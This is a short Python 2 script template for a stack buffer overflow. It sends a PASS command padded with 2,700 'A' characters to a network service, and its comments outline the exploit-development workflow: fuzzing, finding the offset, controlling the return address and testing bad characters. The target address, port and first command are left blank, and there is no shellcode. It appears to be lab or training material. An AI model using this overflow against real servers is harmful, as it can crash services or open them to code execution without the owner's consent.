#!/usr/bin/python

import socket

s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
IpAddress=""
port=
buffer="A" * 2700 

# Based on using fuzz testing with gbd/Immunity...
# Confirm with rough bytes...
# Replace buffer with unique characters (pattern create)
# Find the exact overwrite bytes (pattern_offset)
# 
# Next, confirm with something like: buffer="A"*2555 + "B"*4 + "C"*...
# Check for space on stack to include shellcode
# Check that "bad" characters will not break shellcode - see badchars.txt
#	buffer="A"*2555 + "B"*4 + badchars
#	determine troublesome characters

try:
	print "\nSending overflow..."
	s.connect(({IpAddress},{port}))
	s.recv(1024)
	s.send("") #send parameter -example: "ParameterName value\r\n"
	s.recv(1024)
	s.send("PASS" + buffer + "\r\n") #this request sends the increasing string value
	# s.send("QUIT\r\n")
	s.close() #always close the connection
	print "\nbuffer sent."
except:
	print "Could not connect"
